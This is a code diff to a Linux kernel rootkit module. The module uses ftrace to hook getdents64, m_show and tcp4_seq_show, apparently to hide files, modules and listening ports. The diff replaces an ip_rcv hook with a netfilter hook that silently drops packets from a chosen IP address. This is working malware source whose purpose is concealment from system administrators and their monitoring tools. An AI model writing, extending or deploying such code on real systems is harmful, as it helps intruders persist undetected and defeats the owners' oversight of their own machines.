@@ -9,8 +9,10 @@
 #include <linux/ip.h>
 #include <linux/skbuff.h>
 #include <linux/netdevice.h>
-#include <net/ip.h>
-#include <linux/module.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+
+
 
 #include "ftrace_helper2.h"
 #include "helper.h"
@@ -23,10 +25,10 @@ hooked functions
 static asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
 static asmlinkage int new_getdents64(const struct pt_regs *regs);
 
-asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
- 	   struct net_device *orig_dev);
-asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
- 	   struct net_device *orig_dev);
+// asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+//  	   struct net_device *orig_dev);
+// asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+//  	   struct net_device *orig_dev);
 
 static asmlinkage int new_m_show(struct seq_file *m, void *p);
 static asmlinkage int (*old_m_show)(struct seq_file *m, void *p);
@@ -36,6 +38,10 @@ static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
 
 
 int hide_entry_from_dirent(struct linux_dirent64* dirent, char* entry_name, int len);
+
+static unsigned int drop_ip(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
+
+static struct nf_hook_ops *nfho = NULL;
 
 
 
@@ -69,7 +75,7 @@ MODULE_PARM_DESC(ip_to_block, "hide local listening port from prying eyes.");
 
 
 static struct ftrace_hook hooks[] = {
- 	HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
+ 	//HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
  	HOOK("m_show", new_m_show, &old_m_show),
  	HOOK("__x64_sys_getdents64", new_getdents64, &old_getdents64),
  	HOOK("tcp4_seq_show", new_tcp4_seq_show, &old_tcp4_seq_show),
@@ -77,15 +83,45 @@ static struct ftrace_hook hooks[] = {
 
 
 
+static unsigned int drop_ip(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+	int ip;
+	struct iphdr *ip_header;
+	unsigned int src_ip;
+
+	if (!skb)
+		return NF_ACCEPT;
+	ip = ip_str_to_num(ip_to_block);
+	ip_header = ip_hdr(skb);
+	src_ip = (unsigned int)ip_header->saddr;
+	if (src_ip == ip)
+	{
+		return NF_DROP;
+	}
+	return NF_ACCEPT;
+}
+
+
 static int __init rootkit_enter(void) {
 
 	unsigned int err;
 
 	printk(KERN_INFO "rootkit: started operating\n");
-
+	//install ftrace hooks
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err)
 		return err;
+
+	// netfilter stuff for ip drop functionallity
+
+	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
+	
+	
+	nfho->hook 	= (nf_hookfn*)drop_ip;		/* hook function */
+	nfho->hooknum 	= NF_INET_PRE_ROUTING;		/* received packets */
+	nfho->pf 	= PF_INET;			/* IPv4 */
+	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
+	nf_register_net_hook(&init_net, nfho);
 
 	if (port_to_hide != 0)
 		printk(KERN_INFO "rootkit: loaded component port hiding. hiding listening port %u\n", port_to_hide);
@@ -105,33 +141,35 @@ static int __init rootkit_enter(void) {
 static void __exit rootkit_exit(void) {
 
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	nf_unregister_net_hook(&init_net, nfho);
+
 	printk(KERN_INFO "rootkit: stopped\n");
 }
 
 
-asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
- 	   struct net_device *orig_dev){
+// asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+//  	   struct net_device *orig_dev){
 
-	int ip;
-	struct iphdr* ip_header;
-	unsigned int src_ip;
-	if (NULL == ip_to_block)
-		goto done;
-	// check if there is an IP to block.
-	ip = ip_str_to_num(ip_to_block);
+// 	int ip;
+// 	struct iphdr* ip_header;
+// 	unsigned int src_ip;
+// 	if (NULL == ip_to_block)
+// 		goto done;
+// 	// check if there is an IP to block.
+// 	ip = ip_str_to_num(ip_to_block);
 
-	ip_header = (struct iphdr *)skb_network_header(skb);
-	src_ip = (unsigned int)ip_header->saddr;
+// 	ip_header = (struct iphdr *)skb_network_header(skb);
+// 	src_ip = (unsigned int)ip_header->saddr;
 	
-	if (src_ip == ip)
-	{
-		printk(KERN_INFO "blocked traffic from %s\n", ip_to_block);
-		return NET_RX_DROP;
-	}
-	done:
-		return old_ip_rcv(skb, dev, pt, orig_dev);
+// 	if (src_ip == ip)
+// 	{
+// 		printk(KERN_INFO "blocked traffic from %s\n", ip_to_block);
+// 		return NET_RX_DROP;
+// 	}
+// 	done:
+// 		return old_ip_rcv(skb, dev, pt, orig_dev);
 
-}
+// }
 
 
 /*
